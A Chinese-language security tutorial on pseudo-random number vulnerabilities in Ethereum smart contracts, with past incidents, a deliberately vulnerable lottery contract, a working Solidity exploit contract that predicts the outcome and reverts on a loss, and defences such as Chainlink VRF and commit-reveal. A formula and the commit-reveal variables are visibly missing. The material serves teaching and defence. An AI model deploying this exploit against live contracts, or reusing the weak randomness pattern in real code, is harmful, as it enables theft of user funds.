# 随机数漏洞

在密码学与区块链安全领域，**“链上生成随机数”一直是一个技术悖论**。

以太坊等区块链本质上是**确定性状态机（Deterministic State Machine）**。全网数以万计的节点必须就每一笔交易的结果达成共识。这意味着，给定相同的初始状态和输入，不同节点执行同一段代码必须产生完全一致的结果。然而，真正的随机数（Entropy/True Randomness）本质上是**非确定性**的。

这种底层架构上的矛盾，导致许多智能合约在尝试模拟随机数时引入了致命漏洞，为攻击者留下了巨大的套利空间。


## 1. 深度剖析：为何 EVM 内无法实现真随机？

在传统 Web2 开发中，通过硬件时钟的微小偏差（热噪声）来生成随机数（如 `Math.random()`）是基操。但在 EVM（以太坊虚拟机）中，没有任何操作码可以获取外部的不确定性数据。

为了在链上实现博彩、NFT 盲盒揭开或 GameFi 爆率算法，开发者往往被迫使用**当前链上状态变量**作为随机数生成的种子（Seed）。

**高危的伪随机数源（EVM 操作码）：**

* `block.timestamp` (区块时间戳)：受矿工/验证者微调控制。
* `block.difficulty` (区块难度，合并后映射为 `PREVRANDAO`)：公开且可被验证者操控。
* `blockhash` (历史区块哈希)：仅能获取最近 256 个区块，且完全公开。
* `msg.sender` (调用者地址)：攻击者可轻易通过部署新合约来操纵。

> **核心危机**：链上变量看似无序，实则对同一区块内的所有交易是**完全透明且静态**的。任何人都可以“预知未来”并据此套利。


## 2. 真实安全事故溯源：价值千万的“伪随机”惨案

历史上有多次著名的随机数攻击事件，攻击者正是利用了链上伪随机的确定性特征。

### 案例 A：Meebits NFT 铸造（原子回滚攻击）

* **业务场景**：Meebits 采用“盲盒盲铸”机制，用户支付 ETH 铸造 NFT，其稀有度由链上参数生成的“伪随机数”决定。
* **攻击向量**：**交易原子性（Atomicity）与回滚（Revert）机制**。
* **攻击逻辑**：攻击者编写了一个智能合约，在一个交易事务中先模拟铸造。通过预读结果，如果是稀有款则提交交易；如果是普通款，则触发 `revert()` 回滚整个交易。
* **后果**：攻击者以极低的 Gas 沉没成本（试错成本），精准“狙击”了价值最高的稀有 NFT，彻底摧毁了项目方预设的概率公平性。

### 案例 B：EOS Dice 游戏（出块者合谋预测）

* **业务场景**：基于 EOS 链的各类去中心化博彩游戏。
* **攻击向量**：**DPoS 机制下的状态预知**。
* **攻击逻辑**：游戏依赖“未来区块哈希”作为随机源。但 EOS 的超级节点（BP）出块极快且顺序固定。恶意节点或与其勾结的攻击者可以在区块生成的前一毫秒预知哈希，从而下注必胜的结果。

---

## 3. 技术复现：攻击是如何在代码层实施的？

利用链上伪随机数的攻击核心在于：**在同一个交易（Transaction）中，受害者合约和攻击合约共享着相同的链上全局变量。**

数学上，大多数伪随机数的生成逻辑如下：


### 3.1 存在漏洞的目标合约 (Vulnerable Contract)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract BadLottery {
    // 假设中奖号码是 7
    function play() public payable {
        require(msg.value == 1 ether, "Requires 1 ETH to play"); 
        
        // 典型的伪随机漏洞：使用链上变量组合计算哈希
        uint256 random = uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty, msg.sender))) % 100;
        
        if (random == 7) { 
            payable(msg.sender).transfer(address(this).balance);
        }
    }
}

```

### 3.2 攻击者合约 (Exploit Contract)

攻击者通过**镜像计算（Shadow Execution）**来预知结果。

```solidity
contract AttackLottery {
    BadLottery target;

    constructor(address _target) {
        target = BadLottery(_target);
    }

    function attack() public payable {
        // 1. 本地沙盒预演：由于在同一交易内，以下参数与目标合约获取的完全一致
        uint256 predictedRandom = uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty, address(this)))) % 100;
        
        // 2. 只有百分之百确定能赢时，才发起真实交易
        require(predictedRandom == 7, "Loss condition predicted, reverting transaction");

        // 3. 执行必胜调用
        target.play{value: 1 ether}();
        
        // 收网并提取资金到攻击者 EOA
        payable(msg.sender).transfer(address(this).balance);
    }
    
    // 允许接收 ETH
    receive() external payable {}
}

```

**胜率分析**：100%（只要交易成功上链，即意味着触发了中奖条件）。


## 4. 工程化防御方案：如何引入真随机性？

为了打破 EVM 的确定性牢笼，我们需要将“随机性”的产生过程转移到**链下（Off-Chain）**，或采用复杂的密码学博弈机制。

### 方案一：Chainlink VRF（可验证随机函数） —— 行业标准

这是目前 Web3 最主流、最安全的企业级解决方案。它引入了去中心化预言机网络（DON）。

1. **请求（Request）**：智能合约向 Chainlink 网络发出随机数请求并支付 LINK 代币。
2. **生成（Generate）**：链下节点使用其私钥和链上的未知区块哈希作为种子，生成一个随机数及**密码学证明（Proof）**。
3. **验证（Verify）**：VRF 协调器合约在链上验证该证明。只有当随机数确实是由节点私钥正确生成且未被篡改时，结果才会被接受并回调给用户合约。

* **安全性**：即使预言机节点作恶，也无法伪造随机数，因为其受到椭圆曲线密码学的约束。

### 方案二：Commit-Reveal (承诺-揭示机制)

这是一种不依赖第三方服务的原生密码学方案。

1. **Commit (承诺)**：用户A在本地生成随机数 ，计算  并上链。
2. **Wait (等待)**：等待数个区块确认，锁定当前链上状态。
3. **Reveal (揭示)**：用户A提交明文 。合约验证  匹配后，结合当前的区块哈希生成最终的随机数。

* **缺点**：用户体验差（需两步操作），且存在“扣留攻击”（用户发现揭示后自己会输，从而选择放弃揭示）。

### 方案三：以太坊共识层 RANDAO + VDF（未来趋势）

在以太坊合并为 PoS 之后，共识层引入了 `RANDAO` 操作码。虽然验证者理论上可以通过“放弃出块”来轻微影响随机性，但结合**VDF（可验证延迟函数）**，未来的以太坊将能够提供原生的、无法操纵的抗审查随机数。
